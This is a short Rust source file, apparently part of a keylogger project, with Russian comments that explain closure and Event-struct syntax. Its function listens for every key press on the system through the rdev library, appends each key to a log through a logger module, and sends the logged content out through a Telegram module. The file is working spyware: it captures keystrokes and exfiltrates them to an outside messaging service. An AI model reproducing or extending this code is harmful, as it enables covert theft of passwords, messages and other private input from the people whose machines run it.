use crate::logger;
use crate::telegram;
use rdev::{Event, EventType, listen};

pub fn keylogger_func() {
    listen(|databaseofkey: Event| {
        // listen.1 // цикл-обработчик который запускает функцию каждый раз когда было совершено указаное в дальнейшей функции действие(в данном случае нажатие клавиши).
        // listen.2 // запуск бесконечного цикла listen(который был импортирован из rdev) в котором находяться |databaseofkey: Event| {}.
        // databaseofkey // переменная где находяться 3(event_type, time, name) поля(переменная в которую записывается объект типа Event с тремя полями(event_type, time, name)).
        // databaseofkey: Event // создание переменной databaseofkey c типом данных Event.
        // Event // структура, тип данных что обьединяет несколько полей в один обьект.
        // |databaseofkey: Event| // || создают безымянную функцию где по аналогии с обычной функцией в скобках находяться "databaseofkey: Event".
        if let EventType::KeyPress(_) = databaseofkey.event_type
        // условие  где новосозданная переменная
            && let Some(name) = databaseofkey.name
            && let Some(content) = logger::append_key(&name)
        {
            telegram::send(&content);
        }
    })
    .unwrap();
}
